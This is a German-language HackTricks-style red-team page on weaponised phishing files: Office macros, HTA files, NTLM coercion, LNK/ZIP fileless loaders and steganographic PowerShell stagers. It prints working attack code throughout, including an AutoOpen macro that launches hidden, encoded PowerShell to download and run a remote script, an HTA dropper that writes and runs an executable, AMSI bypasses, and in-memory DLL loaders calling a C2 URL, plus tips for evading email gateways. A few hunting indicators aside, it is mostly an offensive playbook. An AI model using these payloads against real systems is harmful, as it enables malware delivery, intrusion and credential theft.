# Phishing Files & Documents

{{#include ../../banners/hacktricks-training.md}}

## Office Documents

Microsoft Word führt eine Validierung der Dateidaten durch, bevor eine Datei geöffnet wird. Die Datenvalidierung erfolgt in Form einer Identifizierung der Datenstruktur gemäß dem OfficeOpenXML-Standard. Wenn während der Identifizierung der Datenstruktur ein Fehler auftritt, wird die analysierte Datei nicht geöffnet.

In der Regel verwenden Word-Dateien, die Makros enthalten, die Erweiterung `.docm`. Es ist jedoch möglich, die Datei umzubenennen, indem die Dateierweiterung geändert wird, und dennoch die Ausführungsfähigkeit der Makros beizubehalten.  
Zum Beispiel unterstützt eine RTF-Datei von Haus aus keine Makros; eine in RTF umbenannte DOCM-Datei wird jedoch von Microsoft Word verarbeitet und kann Makros ausführen.  
Dieselbe Interna und Mechanismen gelten für alle Programme der Microsoft Office Suite (Excel, PowerPoint etc.).

Sie können den folgenden Befehl verwenden, um zu überprüfen, welche Erweiterungen von bestimmten Office-Programmen ausgeführt werden:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX-Dateien, die auf eine entfernte Vorlage verweisen (File –Options –Add-ins –Manage: Templates –Go), die macros enthält, können macros ebenfalls “ausführen”.

### Externes Laden von Bildern

Gehe zu: _Insert --> Quick Parts --> Field_\
_**Kategorien**: Links and References, **Feldnamen**: includePicture, und **Dateiname oder URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros Backdoor

Es ist möglich, macros zu verwenden, um beliebigen Code aus dem Dokument auszuführen.

#### Autoload-Funktionen

Je häufiger sie verwendet werden, desto wahrscheinlicher wird AV sie erkennen.

- AutoOpen()
- Document_Open()

#### Macros Code-Beispiele
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Metadaten manuell entfernen

Gehe zu **File > Info > Inspect Document > Inspect Document**, wodurch der Document Inspector geöffnet wird. Klicke **Inspect** und dann **Remove All** neben **Document Properties and Personal Information**.

#### Doc-Erweiterung

When finished, select **Save as type** dropdown, change the format from **`.docx`** to **Word 97-2003 `.doc`**.\
Tu dies, weil du **keine Makros in einer `.docx` speichern kannst** und es ein **Stigma** gegenüber der makro-aktivierten **`.docm`**-Erweiterung gibt (z. B. hat das Vorschaubild ein großes `!` und einige Web-/E-Mail-Gateways blockieren sie vollständig). Daher ist diese **veraltete `.doc`-Erweiterung der beste Kompromiss**.

#### Generatoren für bösartige Makros

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA-Dateien

Eine HTA ist ein Windows-Programm, das **HTML und Skriptsprachen (wie VBScript und JScript) kombiniert**. Es erzeugt die Benutzeroberfläche und wird als eine "voll vertrauenswürdige" Anwendung ausgeführt, ohne die Einschränkungen des Sicherheitsmodells eines Browsers.

Eine HTA wird mit **`mshta.exe`** ausgeführt, das typischerweise zusammen mit **Internet Explorer** **installiert** wird, wodurch **`mshta` von IE abhängig ist**. Wenn Internet Explorer deinstalliert wurde, können HTAs nicht ausgeführt werden.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM-Authentifizierung erzwingen

Es gibt mehrere Wege, **NTLM-Authentifizierung "remote" zu erzwingen**, zum Beispiel kannst du **unsichtbare Bilder** in E-Mails oder HTML einfügen, die der Benutzer aufruft (auch HTTP MitM?). Oder sende dem Opfer die **Adresse von Dateien**, die bereits beim **Öffnen des Ordners** eine **Authentifizierung** **auslösen**.

**Sieh dir diese Ideen und mehr auf den folgenden Seiten an:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Vergiss nicht, dass du nicht nur den Hash oder die Authentifizierung stehlen kannst, sondern auch **NTLM relay attacks** durchführen kannst:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Hochwirksame Kampagnen liefern eine ZIP, die zwei legitime Lockvogel-Dokumente (PDF/DOCX) und eine bösartige .lnk enthält. Der Trick besteht darin, dass der eigentliche PowerShell-Loader in den rohen Bytes der ZIP nach einem eindeutigen Marker gespeichert ist, und die .lnk ihn vollständig im Speicher herausschneidet und ausführt.

Typischer Ablauf, umgesetzt durch den .lnk PowerShell one-liner:

1) Finde die ursprüngliche ZIP in üblichen Pfaden: Desktop, Downloads, Documents, %TEMP%, %ProgramData% und dem Parent des aktuellen Arbeitsverzeichnisses.
2) Lese die ZIP-Bytes und finde einen hardcodierten Marker (z. B. xFIQCV). Alles nach dem Marker ist die eingebettete PowerShell-Payload.
3) Kopiere die ZIP nach %ProgramData%, entpacke sie dort und öffne die Lockvogel-.docx, um legitim zu erscheinen.
4) Umgehe AMSI für den aktuellen Prozess: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Deobfuskieren der nächsten Stufe (z. B. entferne alle # Zeichen) und führe sie im Speicher aus.

Beispiel eines PowerShell-Skeletts, das die eingebettete Stufe extrahiert und ausführt:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Hinweise
- Die Zustellung missbraucht häufig vertrauenswürdige PaaS-Subdomains (z. B. *.herokuapp.com) und kann Payloads zurückhalten (liefert harmlose ZIPs basierend auf IP/UA).
- Die nächste Stufe entschlüsselt häufig base64/XOR shellcode und führt ihn via Reflection.Emit + VirtualAlloc aus, um Festplattenartefakte zu minimieren.

Persistenz, die in derselben Kette verwendet wird
- COM TypeLib hijacking des Microsoft Web Browser control, sodass IE/Explorer oder jede App, die es einbettet, die payload automatisch neu startet. Details und einsatzbereite Befehle hier:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ZIP files, die den ASCII-Markerstring (z. B. xFIQCV) enthalten, der an die Archivdaten angehängt ist.
- .lnk, die Parent-/User-Ordner aufzählt, um das ZIP zu finden und ein Köderdokument zu öffnen.
- AMSI-Manipulation via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Long-running business threads, die mit Links enden, welche unter vertrauenswürdigen PaaS-Domains gehostet werden.

## Steganography-delimited payloads in images (PowerShell stager)

Aktuelle Loader-Ketten liefern ein obfuskiertes JavaScript/VBS, das einen Base64 PowerShell stager decodiert und ausführt. Dieser stager lädt ein Image (oft GIF) herunter, das eine Base64-encoded .NET DLL enthält, versteckt als Klartext zwischen einzigartigen Start-/End-Markern. Das Script sucht nach diesen Delimitern (in freier Wildbahn beobachtete Beispiele: «<<sudo_png>> … <<sudo_odt>>>»), extrahiert den dazwischenliegenden Text, decodiert ihn mit Base64 zu Bytes, lädt die Assembly im Speicher und ruft eine bekannte Entry-Methode mit der C2-URL auf.

Workflow
- Stage 1: Archived JS/VBS dropper → decodes embedded Base64 → launches PowerShell stager with -nop -w hidden -ep bypass.
- Stage 2: PowerShell stager → downloads image, carves marker-delimited Base64, loads the .NET DLL in-memory and calls its method (e.g., VAI) passing the C2 URL and options.
- Stage 3: Loader retrieves final payload and typically injects it via process hollowing into a trusted binary (commonly MSBuild.exe). See more about process hollowing and trusted utility proxy execution here:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell example to carve a DLL from an image and invoke a .NET method in-memory:

<details>
<summary>PowerShell stego payload extractor and loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Notizen
- Dies ist ATT&CK T1027.003 (steganography/marker-hiding). Marker variieren zwischen Kampagnen.
- AMSI/ETW bypass und string deobfuscation werden üblicherweise angewendet, bevor die Assembly geladen wird.
- Hunting: scanne heruntergeladene Images nach bekannten Delimitern; identifiziere PowerShell, das auf Images zugreift und sofort Base64-Blobs dekodiert.

Siehe auch stego tools and carving techniques:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Eine wiederkehrende Initialstufe ist eine kleine, stark obfuskierte `.js`- oder `.vbs`-Datei, die in einem Archiv geliefert wird. Ihr einziger Zweck ist es, einen eingebetteten Base64-String zu decodieren und PowerShell mit `-nop -w hidden -ep bypass` zu starten, um die nächste Stufe über HTTPS einzuleiten.

Skelett-Logik (abstrakt):
- Lese den eigenen Dateiinhalt
- Finde einen Base64-Blob zwischen Junk-Strings
- Dekodiere zu ASCII PowerShell
- Ausführen mit `wscript.exe`/`cscript.exe`, die `powershell.exe` aufrufen

Hunting-Indikatoren
- Archivierte JS/VBS-Anhänge, die `powershell.exe` mit `-enc`/`FromBase64String` in der Kommandozeile starten.
- `wscript.exe`, das `powershell.exe -nop -w hidden` aus Benutzer-Temp-Pfaden startet.

## Windows files to steal NTLM hashes

Siehe die Seite über **places to steal NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
